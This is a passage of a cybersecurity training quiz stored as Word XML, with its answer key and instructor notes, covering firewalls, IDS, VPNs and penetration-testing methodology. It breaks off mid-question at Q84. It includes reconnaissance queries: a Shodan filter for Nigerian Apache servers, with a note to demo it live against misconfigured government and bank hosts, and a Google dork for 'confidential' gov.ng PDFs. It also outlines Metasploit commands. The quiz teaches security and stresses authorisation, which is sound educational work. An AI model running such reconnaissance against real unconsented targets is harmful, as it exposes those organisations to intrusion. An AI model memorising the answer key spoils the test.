          <w:b/>
        </w:rPr>
        <w:t>Q69</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The iptables rule `iptables -A INPUT -p tcp --dport 22 -s 192.168.1.100 -j ACCEPT` does what?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Blocks all SSH traffic to the server</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Allows all TCP traffic on port 22 from any IP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Allows TCP traffic on port 22 (SSH) only from the IP address 192.168.1.100</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Drops all packets from 192.168.1.100</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CRITICAL] · *Time:* 60 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Parse each flag: -A INPUT (append to input chain), -p tcp (TCP), --dport 22 (SSH port), -s (source IP), -j ACCEPT (allow). Read the rule aloud with the class.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q70</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Shodan is described as "the world's scariest search engine" because:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) It indexes dark web content invisible to regular browsers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) It tracks users' browsing history across all websites</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>It scans and indexes internet-connected devices and their open services/banners</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) It stores personal data of every internet user</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Shodan finds exposed webcams, industrial controls, servers with default credentials. Both attacker and defender tool.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q71</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which Shodan filter would find devices in Nigeria running Apache web server?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) shodan nginx country:US</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) apache location:Nigeria</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>apache country:NG</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) server:apache region:Lagos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* country:NG filters by Nigeria. Results reveal misconfigured Nigerian government, bank, and ISP servers. Demo this live in class.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q72</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A VPN (Virtual Private Network) primarily provides:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Faster internet speeds through data compression</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Protection against all forms of malware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>An encrypted tunnel for network traffic, protecting data in transit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Anonymous browsing that is completely untraceable</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* VPN ≠ anonymity tool (provider can log). VPN = encrypted tunnel, especially important on public WiFi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q73</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"Signature-based" intrusion detection means:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Using cryptographic signatures to encrypt alert notifications</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Requiring staff signatures before security alerts are acted on</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Comparing traffic against known attack patterns (signatures) in a database</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Authenticating the source of network packets using PKI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Limitation: signature-based cannot detect zero-day attacks (no signature yet). Anomaly-based detects deviations from normal behaviour.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q74</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A false positive in IDS/IPS context means:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) The IDS detected a real attack and correctly alerted the SOC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) The IDS missed a real attack (failed to alert)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The IDS flagged legitimate traffic as malicious (alert with no real threat)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) The IPS blocked a known malicious IP address</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* False positives cause alert fatigue — analysts start ignoring alerts. False negatives (missed attacks) are worse but false positives erode the team's trust in the system.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q75</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ★ DOUBLE POINTS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A security consultant scans the Nigerian government network with Shodan and finds 47 servers running outdated software, three with default credentials, and two webcams with no authentication. No written permission exists. What is the legal and ethical situation?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Legal — Shodan is a passive tool and does not require permission</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Legal — finding security holes is a public service and never criminal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Legal for scanning; illegal only if the consultant logs in to verify</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Potentially illegal under Cybercrimes Act 2015 even for passive scanning without authorisation; findings should be responsibly disclosed, not published or monetised without consent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [SCENARIO] · *Time:* 60 s · *Points:* 2,000 ★</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Controversial — Shodan is public data, but active probing without permission = Cybercrimes Act Section 6. Best practice: responsible disclosure. Debrief: ngCERT has responsible disclosure channels. Never test without written authorisation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>MODULE 6 [INTERMEDIATE]: Ethical Hacking &amp; Penetration Testing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Level: Intermediate | Questions: Q76–Q90*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q76</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is the FIRST phase of the PTES (Penetration Testing Execution Standard) methodology?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Scanning</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Reporting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Pre-engagement Interactions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Pre-engagement = scope, rules of engagement, legal agreements. Nothing happens without signed authorisation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q77</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Google Dork `filetype:pdf site:gov.ng confidential` searches for:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) All PDF files on the internet mentioning Nigeria</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Confidential files stored on Google's servers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PDF files on Nigerian government websites (.gov.ng) that contain the word "confidential"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Hacked government websites that have been indexed by Google</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* OSINT tool — many governments accidentally index sensitive documents. Only use on authorised targets.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q78</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What does CVSS score of 9.8 indicate?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Medium severity — patching within 30 days is acceptable</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Low severity — informational finding only</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) High severity — patch within 7 days</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Critical severity — immediate patching or compensating controls required</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* CVSS 0–3.9=Low, 4–6.9=Medium, 7–8.9=High, 9–10=Critical. 9.8 is near-maximum. Patch immediately.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q79</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The "rules of engagement" in a penetration test define:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) How the penetration tester will be paid</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) The client's internal security policies</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What systems can be tested, what methods are allowed, and what actions are prohibited</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) The qualifications required to perform the test</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Rules of engagement protect both tester and client. Unauthorised actions = breach of contract + criminal liability.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q80</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is the difference between a vulnerability scan and a penetration test?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Vulnerability scans are manual; penetration tests use automated tools</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) There is no difference — both terms mean the same thing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerability scans identify weaknesses; penetration tests actively attempt to exploit them</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Penetration tests are performed only on web applications; vulnerability scans cover networks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Scanning = reconnaissance of problems. Pentest = proving the problems are exploitable. Different depth, cost, and scope.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q81</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which phase of PTES involves researching the target using OSINT before touching any systems?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Post-Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Vulnerability Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Intelligence Gathering</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* OSINT = Open Source Intelligence. LinkedIn, job postings, WHOIS, Google Dorking, Shodan — all passive.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q82</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Metasploit is a penetration testing framework primarily used for:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Scanning networks for open ports</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Analysing malware samples in a sandbox</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Automating exploitation of known vulnerabilities</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Capturing and analysing network packets</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* msfconsole, use &lt;exploit&gt;, set PAYLOAD, set RHOSTS, exploit. Only on authorised targets. Kali Linux includes Metasploit.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q83</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A "black box" penetration test means:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) The tester uses only dark web tools</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) All test results are classified and never shared with the client</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The tester has no prior knowledge of the target system — simulates an external attacker</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) The test only covers network infrastructure, not applications</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Black box = no info. White box = full info (code, architecture). Grey box = partial info (credentials, limited documentation).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q84</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which section of a penetration test report is most important for the CEO and Board to read?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Technical Findings (detailed exploit steps)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
